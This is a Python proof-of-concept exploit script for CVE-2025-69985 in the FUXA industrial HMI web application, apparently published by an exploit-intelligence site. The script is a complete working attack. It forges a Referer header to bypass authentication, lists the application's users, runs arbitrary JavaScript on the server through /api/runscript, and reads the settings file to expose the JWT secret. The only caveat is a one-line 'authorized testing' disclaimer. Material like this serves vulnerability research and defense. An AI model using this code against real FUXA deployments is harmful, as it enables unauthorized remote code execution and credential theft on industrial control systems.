#!/usr/bin/env python3
# ──────────────────────────────────────────────────────────────────────
# Exploit Title  : FUXA <= 1.2.8 User Enumeration & Config Exposure
# CVE            : CVE-2025-69985
# Vendor         : frangoteam
# Product        : FUXA
# Affected       : All versions <= 1.2.8 (through v1.2.11 / latest)
# Type           : CWE-288 - Authentication Bypass Using Alternate Path
# CVSS           : 9.8 (Critical)
# Platform       : Node.js / Docker
# Author         : Exploit Intelligence Platform
# Website        : https://exploit-intel.com
# Twitter        : @exploit_intel
# Date           : 2026-02-28
#
# For authorized security testing and educational purposes only.
# ──────────────────────────────────────────────────────────────────────
"""
PoC Vector 3 for CVE-2025-69985: Unauthenticated User Enumeration & Config Exposure

Demonstrates that the authentication bypass in FUXA <= 1.2.8 allows an
unauthenticated attacker to enumerate users, verify admin-level access,
and read sensitive configuration files.

ATTACK CHAIN:
  1. Spoof Referer header to bypass requireAuth
  2. GET /api/users to enumerate existing users
  3. POST /api/runscript to verify admin-level code execution
  4. Read FUXA settings files via RCE (secretCode, etc.)

PREREQUISITES:
  - Network access to FUXA instance on port 1881
  - Python 3 (stdlib only)

REFERENCES:
  - CVE-2025-69985 / GHSA-4r4r-4jp4-wwf9
  - https://nvd.nist.gov/vuln/detail/CVE-2025-69985
"""

import sys
import json
import http.client
import hashlib
import time


DEFAULT_HOST = "localhost"
DEFAULT_PORT = 1881


def enumerate_users(target_host, target_port):
    """
    Enumerate all users via GET /api/users.

    The endpoint is protected by verifyApiOrToken which:
    - When secureEnabled=false: immediately passes
    - When secureEnabled=true: calls verifyToken which never rejects
    """
    referer = f"http://{target_host}:{target_port}/fuxa"

    headers = {
        "Content-Type": "application/json",
        "Referer": referer,
    }

    print(f"[*] Enumerating users via GET /api/users ...")

    try:
        conn = http.client.HTTPConnection(target_host, target_port, timeout=15)
        conn.request("GET", "/api/users", headers=headers)
        response = conn.getresponse()
        status = response.status
        raw = response.read().decode("utf-8", errors="replace")
        conn.close()
    except Exception as e:
        print(f"[-] Request failed: {type(e).__name__}: {e}")
        return False, []

    print(f"[*] HTTP Status: {status}")

    if status == 200:
        try:
            users = json.loads(raw)
        except json.JSONDecodeError:
            print(f"[!] Response is not valid JSON")
            print(f"    Raw: {raw[:500]}")
            return True, []  # Auth bypass worked but no users

        if isinstance(users, list):
            print(f"[+] SUCCESS - Found {len(users)} user(s)!")
            print()
            print("=" * 60)
            print("  USER ENUMERATION RESULTS")
            print("=" * 60)
            for user in users:
                username = user.get("username", "unknown")
                groups = user.get("groups", [])
                info = user.get("info", "")
                print(f"  User: {username}")
                print(f"    Groups: {groups}")
                if info:
                    print(f"    Info: {info}")
                print()
            print("=" * 60)
            return True, users
        elif isinstance(users, dict):
            # Some versions return a dict mapping username -> user object
            print(f"[+] SUCCESS - Found {len(users)} user(s)!")
            print()
            print("=" * 60)
            print("  USER ENUMERATION RESULTS")
            print("=" * 60)
            for username, user_data in users.items():
                groups = user_data.get("groups", []) if isinstance(user_data, dict) else "?"
                print(f"  User: {username}  Groups: {groups}")
            print("=" * 60)
            return True, list(users.values()) if all(isinstance(v, dict) for v in users.values()) else []
        else:
            print(f"[+] Auth bypass worked. Response: {raw[:300]}")
            return True, []

    elif status == 401:
        print(f"[-] FAILED - Authentication required")
        return False, []
    else:
        print(f"[-] Unexpected response: HTTP {status}")
        print(f"    Response: {raw[:500]}")
        return False, []


def verify_rce_as_admin(target_host, target_port):
    """
    Verify the auth bypass gives admin-level access by checking the /api/runscript
    endpoint returns a result (not a 403/unauthorized). This confirms that the
    verifyGroups function returns admin permission level (-1) for unauthenticated users.
    """
    referer = f"http://{target_host}:{target_port}/fuxa"

    headers = {
        "Content-Type": "application/json",
        "Referer": referer,
    }

    # Use a harmless command to verify admin access
    payload = {
        "params": {
            "script": {
                "test": True,
                "name": "verify_admin",
                "code": 'return JSON.stringify({user: process.env.USER || "root", pid: process.pid, cwd: process.cwd()})',
                "parameters": []
            }
        }
    }

    print(f"[*] Verifying admin-level access via /api/runscript ...")

    try:
        conn = http.client.HTTPConnection(target_host, target_port, timeout=15)
        conn.request("POST", "/api/runscript",
                     body=json.dumps(payload), headers=headers)
        response = conn.getresponse()
        status = response.status
        raw = response.read().decode("utf-8", errors="replace")
        conn.close()
    except Exception as e:
        print(f"[-] Request failed: {type(e).__name__}: {e}")
        return False

    if status == 200:
        print(f"[+] Admin access CONFIRMED - runscript returned: {raw[:200]}")
        return True
    else:
        print(f"[-] Admin access not confirmed (HTTP {status})")
        return False


def read_sensitive_files(target_host, target_port):
    """
    Use RCE to read sensitive FUXA configuration files, demonstrating
    the escalation from auth bypass to full system compromise.
    """
    referer = f"http://{target_host}:{target_port}/fuxa"
    headers = {
        "Content-Type": "application/json",
        "Referer": referer,
    }

    # Read the FUXA settings file which may contain secretCode
    js_code = (
        'const fs = require("fs");'
        'const path = require("path");'
        'try {'
        '  const settingsPath = path.join(process.cwd(), "_appdata", "mysettings.json");'
        '  if (fs.existsSync(settingsPath)) {'
        '    return "SETTINGS: " + fs.readFileSync(settingsPath, "utf8");'
        '  } else {'
        '    const defaultPath = path.join(process.cwd(), "settings.default.js");'
        '    if (fs.existsSync(defaultPath)) {'
        '      return "DEFAULT_SETTINGS: " + fs.readFileSync(defaultPath, "utf8").substring(0, 500);'
        '    }'
        '    return "NO_SETTINGS_FILE";'
        '  }'
        '} catch(e) { return "ERROR: " + e.message; }'
    )

    payload = {
        "params": {
            "script": {
                "test": True,
                "name": "read_settings",
                "code": js_code,
                "parameters": []
            }
        }
    }

    print(f"[*] Reading FUXA settings via RCE ...")

    try:
        conn = http.client.HTTPConnection(target_host, target_port, timeout=15)
        conn.request("POST", "/api/runscript",
                     body=json.dumps(payload), headers=headers)
        response = conn.getresponse()
        status = response.status
        raw = response.read().decode("utf-8", errors="replace")
        conn.close()
    except Exception as e:
        print(f"[-] Request failed: {type(e).__name__}: {e}")
        return False

    if status == 200:
        # Strip JSON string encoding
        output = raw.strip()
        if output.startswith('"') and output.endswith('"'):
            try:
                output = json.loads(output)
            except json.JSONDecodeError:
                pass

        print(f"[+] Settings file content:")
        print()
        print("=" * 60)
        print("  SENSITIVE FILE CONTENT")
        print("=" * 60)
        print(output)
        print("=" * 60)

        if "secretCode" in output:
            print()
            print("[!] JWT Secret Code EXPOSED - attacker can forge tokens!")

        return True
    else:
        print(f"[-] Failed to read settings (HTTP {status})")
        return False


def main():
    import argparse

    parser = argparse.ArgumentParser(
        description="CVE-2025-69985 Vector 3: User Enumeration & Admin Takeover"
    )
    parser.add_argument("-t", "--target", default=DEFAULT_HOST,
                        help=f"Target host (default: {DEFAULT_HOST})")
    parser.add_argument("-p", "--port", type=int, default=DEFAULT_PORT,
                        help=f"Target port (default: {DEFAULT_PORT})")

    args = parser.parse_args()

    print()
    print("=" * 60)
    print("  CVE-2025-69985 Vector 3: User Enumeration & Takeover")
    print("  Unauthenticated access to /api/users + config files")
    print("=" * 60)
    print()

    # Step 1: Enumerate users
    success_enum, users = enumerate_users(args.target, args.port)

    # Step 2: Verify admin-level code execution
    print()
    success_admin = verify_rce_as_admin(args.target, args.port)

    # Step 3: Read sensitive configuration files (secretCode, etc.)
    print()
    success_files = read_sensitive_files(args.target, args.port)

    # Summary
    print()
    print("=" * 60)
    print("  SUMMARY")
    print("=" * 60)
    print(f"  User enumeration:      {'SUCCESS' if success_enum else 'FAILED'}")
    print(f"  Admin-level access:    {'CONFIRMED' if success_admin else 'NOT CONFIRMED'}")
    print(f"  Config file exposure:  {'EXPOSED' if success_files else 'NOT EXPOSED'}")
    print("=" * 60)

    any_success = success_enum or success_admin or success_files
    sys.exit(0 if any_success else 1)


if __name__ == "__main__":
    main()
